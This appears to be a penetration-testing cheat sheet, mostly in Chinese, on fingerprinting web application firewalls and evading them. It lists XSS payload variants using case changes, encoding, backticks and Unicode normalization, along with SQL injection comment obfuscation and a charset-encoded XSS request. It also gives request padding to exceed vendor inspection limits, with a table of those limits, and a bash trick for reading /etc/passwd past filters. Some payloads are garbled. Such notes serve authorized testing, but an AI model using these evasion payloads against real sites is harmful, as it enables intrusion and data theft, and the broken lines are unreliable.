# Web Application Firewall (WAF)
https://medium.com/@allypetitt/5-ways-i-bypassed-your-web-application-firewall-waf-43852a43a1c2 <br>
## 手動識別 WAF
- WAF 的名稱Server 標題（例如Server: cloudflare）
- 與 WAF 相關的其他 HTTP 回應標頭（例如CF-RAY: xxxxxxxxxxx）
- 看似由 WAF 設定的 Cookie（例如回應標頭Set-Cookie: __cfduid=xxxxx）
- 提交惡意請求時的唯一回應代碼。 （例如412）
- 可以透過FIN/RST向伺服器發送 TCP 封包

## 自動化識別 WAF
1. Nmap
  - Nmap 腳本引擎 (NSE) 包含用於偵測和指紋辨識防火牆的腳本
  - $ nmap --script=http-waf-fingerprint,http-waf-detect -p443 example.com
2. WafW00f
  - 命令列實用程序
  - $ wafw00f example.com
3. WhatWaf

# Bypassing WAFs
## Bypassing Regex 繞過正規表示式
- 更改有效載荷的大小寫 :
    - <sCrIpT>alert(XSS)</sCriPt> 
- 使用各種編碼、替換函數或字元 :
    - 在前面加上一個額外的「<」:  << script>alert(XSS)</script >
    - 刪除結束標籤 :  <script>alert(XSS) //
    - 使用反引號取代代號代替 : <script>alert`XSS`</script>
- 使用其他語法以及使用換行符或製表符。
    - 雙開尖括號 : java%0ascript:alert ( http.com 
    - 不常見的標籤 : <"STYLE>.classname{background-image:url( "javascript:alert(XSS)" );/STYLE">
    - 需要繞過: <"img/src=1/onerror=alert(0)">
    - 額外字符 : aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa href=javascript:alert(1)>xss</a">"

## Obfuscation 混淆 
- Function( "ale" + "rt(1)" )(); #使用除了 alert、console.log 和 prompt 之外的不常見函數javascript
- /? id =1+un/**/ion+sel/**/ect+1,2,3-- #在 SQL 查詢中使用註解來分解語句
- new Function`alt\`6\``; #使用反引號而不是括號
- data:text/html; base64 4mPHxNv564Fx2Fv)5(Q/html; base2W.編碼 javascript %26%2397;lert(1) #使用 HTML 編碼
- <a src= "%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A%3Aconfirm ( XSSDY #$%&()*~+-_.,:;?@[/|\]^`=confirm()> # 在事件處理程序和等號之間使用任何非字母、數字或封裝字元（僅適用於 Gecko 引擎）

## Charset 字元集
- 修改Content-Type標頭以使用不同的字元集（例如ibm500）
- Python
$ python3  <br>
-- snip --  <br>
>>>  import urllib.parse <br>
>>>  s = '<script>alert("xss")</script>' <br>
 >>>  urllib.parse.quote_plus(s.encode( "IBM037" )) <br>
 'L%A2%83%99%89%97%A3n%81%93%85%99%A3M%7F%A7%A2%A2%7F%5DLa%A2%83%99%89%97%A3n' <br>

- 將編碼後的字串傳送到請求正文中並上傳到伺服器 <br>
POST /comment/post HTTP/1.1 <br>
Host: chatapp <br>
Content-Type: application/x-www-form-urlencoded; charset=ibm500 <br>
Content-Length: 74 <br>
%A2%83%99%89%97%A3n%81%93%85%99%A3M%7F%A7%A2%A2%7F%5DLa%A2%83%99%89%97%A3 <br>

## Content Size 內容大小
- 如果有效負載超過一定大小，則不會檢查請求
- add gibberi e.g 8kb char
## Unicode Compatibility
- 將視覺上不同的字元分解為相同的基本抽象字元
- NFC：規範化形式規範組合
- NFD：規範化形式規範分解
- NFKC：規範化形式相容性組合
- NFKD：範式相容性分解
e.g ＜img src=p onerror='prompt(1)'> --> ＜img src⁼p onerror⁼＇prompt⁽1⁾＇﹥
## Uninitialized Variables 未初始化
- Bash 將未初始化的變數視為空字串
- echo $u
- cat$u /etc%u/passwd$u

## Tools (Burp plugin)
- Bypass WAF
    - https://portswigger.net/bappstore/ae2611da3bbc4687953a1f4ba6a4e04c
- WAF Bypadd
    - https://portswigger.net/bappstore/14c6fc737ce4468b807b80023d9740a8
    - 透過使用虛擬資料填充 HTTP 請求來繞過 Web 應用程式防火牆 (WAF)
- nowafpls
    - https://github.com/assetnote/nowafpls
    - 透過使用虛擬資料填充 HTTP 請求來繞過 Web 應用程式防火牆 (WAF)

## 已記錄的 WAF 限制
- Cloudflare: 128 KB for ruleset engine, up to 500 MB for enterprise
- AWS WAF	: 8 KB - 64 KB (configurable depending on service)
- Akamai	: 8 KB - 128 KB
- Azure WAF	: 128 KB
- Fortiweb by Fortinet: 100 MB
- Barracuda WAF: 64 KB
- Sucuri: 10 MB
- Radware AppWall	: up to 1 GB for cloud WAF
- F5 BIG-IP WAAP: 20 MB (configurable)
- Palo Alto: 10 MB
- Cloud Armor by Google: 8 KB (can be increased to 128 KB)
